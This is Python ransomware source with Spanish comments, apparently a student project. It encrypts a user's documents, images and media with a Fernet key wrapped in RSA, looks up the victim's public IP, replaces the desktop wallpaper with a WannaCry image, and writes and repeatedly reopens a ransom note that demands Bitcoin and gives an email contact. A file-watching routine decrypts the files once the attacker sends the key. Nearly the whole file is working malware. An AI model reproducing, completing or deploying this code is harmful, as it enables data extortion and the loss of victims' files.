# Imports
from cryptography.fernet import Fernet # cifrar/descifrar archivos en el sistema de destino
import os # para obtener la raíz del sistema
import webbrowser # para cargar el navegador web para ir a un sitio web específico, por ejemplo, bitcoin
import ctypes # para que podamos interactuar con los archivos DLL de Windows y cambiar el fondo de Windows, etc.
import urllib.request # utilizado para descargar y guardar la imagen de fondo
import requests # utilizado para hacer una solicitud a api.ipify.org para obtener la dirección IP de la máquina de destino
import time # utilizado para cronometrar el intervalo de sueño para la nota de rescate y verificar el escritorio para descifrar el sistema/archivos
import datetime # para dar un límite de tiempo en la nota de rescate
import subprocess # para crear un proceso para el bloc de notas y abrir una nota de rescate
# import win32gui # utilizado para obtener el texto de la ventana para ver si la nota de rescate está encima de todas las demás ventanas
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # utilizada para la nota de rescate y la clave de descifrado en dekstop

#Designed by Christian Pérez

class RansomWare:

    
    # Las extenciones de los archivos que queremos encriptar
    file_exts = [
         'txt',
       'png',
       'jpeg',
       'jpg',
       'pdf',
       'docx',
       'docx',
       'mp4',
       'mp3'

    ]


    def __init__(self):
       # Clave que se utilizará para el objeto Fernet y el método de cifrado/descifrado
        self.key = None
       # Cifrar/Descifrar
        self.crypter = None
       # Clave pública RSA utilizada para cifrar/descifrar objetos fernet, por ejemplo, clave simétrica
        self.public_key = None

      
        # Usamos sysroot para crear todos los path parea archivos, y para poder encriptar el sistema
        self.sysRoot = os.path.expanduser('~')
        # Definimos la ruta en la que queremos que cifre los archivos
        self.localRoot = r'C:\Users\Proy Redes\Desktop' # Debugging/Testing

       # Obtenga la IP pública de la persona, para más análisis, etc.
        self.publicIP = requests.get('https://api.ipify.org').text


    # Genera una [SYMMETRIC KEY] en la maquina de la victima en la cual se va a encriptar los archivos
    def generate_key(self):
        # Genera una url segura(basada en base64) 
        self.key =  Fernet.generate_key()
        # Createa un objeto fernet de encripción y desencripcion
        self.crypter = Fernet(self.key)

    
    #escribe la clave simetrica en un archivo de texto
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


    # Encriptación simetrica que va a ser creada en la maquina de la victima
 
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # key RSA publica
            self.public_key = RSA.import_key(open('public.pem').read())
            # creamos el objeto publico para encriptar.
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encripta una clave fern
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Escribe la clave encriptada en un archivo
            f.write(enc_fernent_key)
        #Escribe una key fernet en el escritorio con las indicaciones para recuperar el acceso
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # asigna una contraseña de encriptacion
        self.key = enc_fernent_key
        #remueve la clave de encriptación
        self.crypter = None


   # [CLAVE SIMÉTRICA] Fernet Cifrar/Descifrar archivo - ruta_de_archivo:str:ruta de archivo absoluta, por ejemplo, C:/Carpeta/Carpeta/Carpeta/Nombre de archivo.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
          # Leer datos del archivo
            data = f.read()
            if not encrypted:
               # Imprimir contenido del archivo - [depuración]
                #imprimir(datos)
                # Cifrar datos del archivo
                _data = self.crypter.encrypt(data)
               # Registrar archivo encriptado e imprimir contenido encriptado - [depuración]
                print('> File encrpyted')
                #print(_data)
                print("\n´´´´´´´´´´´´´´´´´´ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´`"
"\n´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´"
"\n´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´"
"\n´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´"
"\n´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´"
"\n´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´`´´´´´´´´´´´¶¶´´´´´´´´´´`"
"\n´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´"
"\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´"
"\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´"
"\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´"
"\n´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´"
"\n´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´"
"\n´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´"
"\n´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´"
"\n´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´"
"\n´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´¶¶´´´´´´¶¶¶¶´´´"
"\n´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶¶¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´"
"\n´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´"
"\n´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´"
"\n¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶"
"\n¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶"
"\n´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´"
"\n´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´´¶¶´´´´´´´´´´´¶¶´´¶¶¶´´¶¶¶¶¶¶´´´´´´´´"
"\n´´´´´´´´´´´´´´¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´"
"\n´´´´´´´´´´´´´´´´´´¶¶´¶¶´¶´¶´¶´¶´¶´¶´¶´¶´¶¶´´´´´´´´´´´´´´´´´"
"\n´´´´´´´´´´´´´´´´¶¶¶¶´´¶´¶´¶´¶´¶´¶´¶´¶´´´¶¶¶¶¶´´´´´´´´´´´´´´"
"\n´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´"
"\n´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´"
"\n´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´"
"\n´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´"
"\n´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´"
"\n´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´"
"\n´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´")

            else:
               # Descifrar datos del archivo
                _data = self.crypter.decrypt(data)
               # Archivo de registro descifrado e impresión de contenidos descifrados - [depuración]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
           # Escribe datos cifrados/descifrados en el archivo usando el mismo nombre de archivo para sobrescribir el archivo original
            fp.write(_data)


   # [CLAVE SIMÉTRICA] Fernet Cifrar/Descifrar archivos en el sistema usando la clave simétrica que se generó en la máquina de la víctima
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        # Para abrir la pagina de bitcoin y que la victima pueda realizar el resacte
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://coddii.org/wp-content/uploads/2021/05/wannacry.jpg'
       # Va a la URL específica, descarga y guarde la imagen usando la ruta dada
        path = f'{self.sysRoot}/Desktop/Grupo1.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Accede a las dlls de Windows para la funcionalidad, por ejemplo, en este caso cambiar el fondo de escritorio
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
				
				!!! YOU ARE HACKED !!!

LOS ARCHIVOS LOCALES DE TU COMPUTADORA HAN SIDO ENCRIPTADOS POR G7UP0 #1
PARA RECUPERARLOS SOLO NECECITARAS SEGUIR LOS SIGUIENTES PASOS Y PAGAR UN
RESCATE, SIGUE LOS SIGUIENTES PASOS:

PARA RECUPERAR EL ACCESO A TUS ARCHIVOS TIENES QUE:

1. Enviar el Archivo denominado EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt
 al correo jostin.vega@epn.edu.ec

2. Vas a realizar un pago de 1 Bitcoin a la siguiente billertera virtual:
Zpub6xX7Y9upan8RMJEqLL1wvF7u8QGP8Ra33STzuZxQE9ZKHXLdnBVx6CmjHs1xBpS4LtYLvc7mPii9fwUBBopPD7vxrEFowoTTxAUFFoaFKpY.

  Una vez que se haya completado el pago, envíe otro correo electrónico a
   jostin.vega@epn.edu.ec indicando "PAGADO". Verificaremos si el pago ha sido pagado.

3.Recibirá un archivo de texto con su CLAVE que desbloqueará todos sus archivos.
   IMPORTANTE: para descifrar sus archivos, coloque el archivo de texto en el
    escritorio y espere. Poco después comenzará a descifrar todos los archivos.

ADVERTENCIA:
NO intente descifrar sus archivos con ningún software, ya que está obsoleto
 y no funcionará, y puede costarle más desbloquear sus archivos.
NO cambie los nombres de los archivos, no altere los archivos ni ejecute el
 software de descifrado, ya que le costará más desbloquear sus archivos.
-y existe una alta probabilidad de que pierda sus archivos para siempre.
NO envíe el botón "PAGADO" sin pagar, el precio subirá por desobediencia.
NO piense que no eliminaremos sus archivos por completo y tiraremos la clave
 si se niega a pagar. LO HAREMOS  > - - <.
''')


    def show_ransom_note(self):
        # Abrir la nota de rescate
       # ransom = subprocess.Popen(['test.bat'])
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('La nota no esta en la pantalla - no intentes nada') # Debugging/Testing
                pass
            else:
                print('La nota Ranmsom no esta en la ventana ') # Debugging/Testing
                
                time.sleep(0.1)
                ransom.kill()
                # Abre la ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # espera 10 segundos
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    
   # Descifra el sistema cuando un archivo de texto con una clave sin cifrar se coloca en el escritorio de la máquina de destino
    def put_me_on_desktop(self):
    
        print('Inicio') # Bucle para verificar el archivo y si el archivo leerá la clave y luego self.key + self.cryptor serán válidos para descifrar-
        # -Los archivos
        while True:
            try:
                print('Intentando') 
               # El ATACANTE descifra la clave simétrica fernet en su máquina y luego coloca la clave fernet sin cifrar.
                # -ingresa este archivo y lo envía en un correo electrónico a la víctima. Luego ponen esto en el escritorio y será-
                # -utilizado para descifrar el sistema. EN NINGÚN MOMENTO LES DAMOS LA LLAVE ASIMETRICA PRIVADA etc.
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Desencripta el sistema una vez que se encuentra el archivo y tenemos cryptor con la clave correcta
                    self.crypt_system(encrypted=True)
                    print('Desencripcion exitosa *-*') 
                    break
            except Exception as e:
                print(e) # Probando
                pass
            time.sleep(10) # Buscando la key desencriptada cada 10 segundos
            print('Buscando el archivo: PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
         



def main():
   
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
  # print('> RansomWare: Ataque completado en la máquina de destino, encriptacion exitosa') # Depuración/Prueba
    print('> RansomWare: Esperando a que el atacante Jostin Quiles entregue el documento de la máquina de destino que descifrará esta máquina') # Depuración/Prueba
    t2.start()
    print('> RansomWare:  Enbuenahora has seguido los pasos y tus archivos se han recuperado *-*') # Depuración/Prueba
    print('> RansomWare: Completado') # Depuración/Prueba

if __name__ == '__main__':
    main()
 
